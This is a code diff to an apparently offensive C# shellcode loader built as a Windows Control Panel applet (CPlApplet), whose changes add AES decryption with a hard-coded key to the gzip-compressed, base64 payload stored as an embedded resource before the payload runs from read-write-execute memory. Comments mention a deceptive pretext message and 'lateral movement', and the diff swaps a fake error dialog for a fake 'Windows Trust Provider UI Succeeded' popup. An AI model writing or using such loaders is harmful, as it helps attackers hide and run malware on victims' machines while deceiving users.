@@ -6,9 +6,14 @@ using System.IO;
 using System.Text;
 using System.IO.MemoryMappedFiles;
 using System.Windows.Forms;
+using System.Security.Cryptography;
+using System.IO.Compression;
 
 public class Test
 {
+    public const int KEY_SIZE = 16;
+    public const string KEY = "changeme";
+
     private static string ExtractResource(string filename)
     {
         var assembly = Assembly.GetExecutingAssembly();
@@ -24,27 +29,45 @@ public class Test
     }
     private delegate IntPtr GetPebDelegate();
 
-    static byte[] Decompress(byte[] gzip)
+
+    public static byte[] Decompress(byte[] input)
     {
-        using (System.IO.Compression.GZipStream stream = new System.IO.Compression.GZipStream(new System.IO.MemoryStream(gzip),
-            System.IO.Compression.CompressionMode.Decompress))
+        using (var source = new MemoryStream(input))
         {
-            const int size = 4096;
-            byte[] buffer = new byte[size];
-            using (System.IO.MemoryStream memory = new System.IO.MemoryStream())
+            byte[] lengthBytes = new byte[4];
+            source.Read(lengthBytes, 0, 4);
+
+            var length = BitConverter.ToInt32(lengthBytes, 0);
+            using (var decompressionStream = new GZipStream(source,
+                CompressionMode.Decompress))
             {
-                int count = 0;
-                do
-                {
-                    count = stream.Read(buffer, 0, size);
-                    if (count > 0)
-                    {
-                        memory.Write(buffer, 0, count);
-                    }
-                }
-                while (count > 0);
-                return memory.ToArray();
+                var result = new byte[length];
+                decompressionStream.Read(result, 0, length);
+                return result;
             }
+        }
+    }
+
+    static byte[] Decrypt(string password, byte[] encryptedBytes)
+    {
+
+        var sha256CryptoServiceProvider = new SHA256CryptoServiceProvider();
+        var hash = sha256CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(password));
+        var key = new byte[KEY_SIZE];
+        var iv = new byte[KEY_SIZE];
+
+        Buffer.BlockCopy(hash, 0, key, 0, KEY_SIZE);
+        Buffer.BlockCopy(hash, KEY_SIZE, iv, 0, KEY_SIZE);
+
+        using (var cipher = new AesCryptoServiceProvider().CreateDecryptor(key, iv))
+        using (var source = new MemoryStream(encryptedBytes))
+        using (var output = new MemoryStream())
+        {
+            using (var cryptoStream = new CryptoStream(source, cipher, CryptoStreamMode.Read))
+            {
+                cryptoStream.CopyTo(output);
+            }
+            return output.ToArray();
         }
     }
 
@@ -52,21 +75,21 @@ public class Test
     public unsafe static IntPtr CPlApplet()
     {
         // Change this for your pretext or comment out for lateral movement
-        MessageBox.Show("Action Failed Error Number 2950");
-        
+        //MessageBox.Show("Windows Trust Provider UI Succeeded", "Success");
+
         string scode = ExtractResource("ControlPanelMaker.Resources.txt");
         byte[] blob = Convert.FromBase64String(scode);
-        byte[] shellcode = Decompress(blob);
+        byte[] sc = Decompress(blob);
+        byte[] shellcode = Decrypt(KEY, sc);
 
         if (shellcode.Length == 0) return IntPtr.Zero;
-
         MemoryMappedFile mmf = null;
         MemoryMappedViewAccessor mmva = null;
 
         try
         {
             // Create a read/write/executable memory mapped file to hold our shellcode..
-            mmf = MemoryMappedFile.CreateNew("__shellcode", shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute);
+            mmf = MemoryMappedFile.CreateNew("__sc", shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute);
 
             // Create a memory mapped view accessor with read/write/execute permissions..
             mmva = mmf.CreateViewAccessor(0, shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute);
@@ -93,5 +116,6 @@ public class Test
             mmva?.Dispose();
             mmf?.Dispose();
         }
+
     }
 }
